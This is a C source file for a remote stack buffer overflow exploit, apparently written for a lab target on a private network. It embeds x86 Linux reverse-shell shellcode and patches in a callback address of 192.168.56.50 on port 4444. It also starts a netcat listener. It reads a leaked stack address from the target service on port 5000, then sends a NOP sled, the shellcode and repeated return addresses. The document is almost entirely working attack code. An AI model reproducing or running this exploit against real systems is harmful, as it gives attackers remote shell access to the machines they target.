#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include  <sys/types.h>
#define BUF_SIZE 1064

char shellcode[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";
int run_nc = 0;
int nc_s;
int nc_vul;
void* nc_handler()
{
    socklen_t cli_size;
    struct sockaddr_in srv, cli;
    cli_size = sizeof(cli);
    nc_s = socket(AF_INET, SOCK_STREAM, 0);
    if (nc_s == -1)
    {
        perror("socket() failed");
        return 2;
    }
    srv.sin_addr.s_addr = INADDR_ANY;
    srv.sin_port = htons( (unsigned short int) atol("4444"));
    srv.sin_family = AF_INET;
    if (bind(nc_s, (struct sockaddr *)&srv, sizeof(srv)) == -1)
    {
        perror("bind() failed");
        return 3;
    }
    if (listen(nc_s, 3) == -1)
    {
        perror("listen() failed");
        return 4;
    }
    for(;;)
    {
        nc_vul = accept(nc_s, (struct sockaddr *)&cli, &cli_size);
        if (nc_vul == -1)
        {
           perror("accept() failed");
           return 5;
        }
        // printf("client from %s", inet_ntoa(cli.sin_addr));
        // close(c);
    }
}

int main(int argc, char *argv[]) {
    pid_t  pid;
    pid = fork();
    system("nc -l 4444");
    // nc_handler();
    if (pid == 0)
    {
        int s, i, size;
        char buffer[BUF_SIZE];
        struct sockaddr_in remote;
        struct hostent *host;
    
        if(argc != 2) {
            printf("Usage: %s target-ip \n", argv[0]);
            return -1;
        }
        host=gethostbyname(argv[1]);
        remote.sin_family = AF_INET;
        remote.sin_addr = *((struct in_addr *)host->h_addr);
        remote.sin_port = htons(atoi("5000"));
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0)
        {
            fprintf(stderr, "Error: Socket\n");
            return -1;
        }
        if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1)
        {
            close(s);
            fprintf(stderr, "Error: connect\n");
            return -1;
        }
        char* name = "toan";
        size = send(s, name, sizeof(name), 0);
        if (size==-1)
        {
            close(s);
            fprintf(stderr, "sending name failed\n");
            return -1;
        }
        char address[1024];
        size = recv(s, address, sizeof(address), 0);
        if (size==-1)
        {
            close(s);
            fprintf(stderr, "get address failed\n");
            return -1;
        }
        int num_exploit;
        char buf_num[1024];
        int k=0;
        int j=0;
        for(k=44;k<strlen(address);k++)
        {
            buf_num[j] = address[k];
            j++;
        }
        printf("%s\n", buf_num);
        sscanf(buf_num, "%x", &num_exploit);
        num_exploit = num_exploit+0x10;
        printf("%x\n", num_exploit);
        close(s);
        memset(buffer, 0x90, BUF_SIZE);
        shellcode[33] = 192; 
        shellcode[34] = 168;
        shellcode[35] = 56;
        shellcode[36] = 50;
        shellcode[39] = 17;
        shellcode[40] = 92;
        memcpy(buffer+900-sizeof(shellcode) , shellcode, sizeof(shellcode)-1);
        host=gethostbyname(argv[1]);
        if (host==NULL)
        {
            fprintf(stderr, "Unknown Host %s\n",argv[1]);
            return -1;
        }
        for(i=901; i < BUF_SIZE-4; i+=4) { 
            * ((int *) &buffer[i]) = num_exploit;
        }
        buffer[BUF_SIZE-1] = 0x0;
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0)
        {
            fprintf(stderr, "Error: Socket\n");
            return -1;
        }
        if (connect(s, (struct sockaddr *)&remote, sizeof(remote))==-1)
        {
            close(s);
            fprintf(stderr, "Error: connect\n");
            return -1;
        }
        size = send(s, buffer, sizeof(buffer), 0);
        if (size==-1)
        {
            close(s);
            fprintf(stderr, "sending data failed\n");
            return -1;
        }
        printf("Send buffer packet success\n");
        close(s);
    }
    // char* cmd = "ls";
    // int s_t = send(nc_vul, cmd, sizeof(cmd), 0);
    // printf("Send command success %d\n", s_t);
}
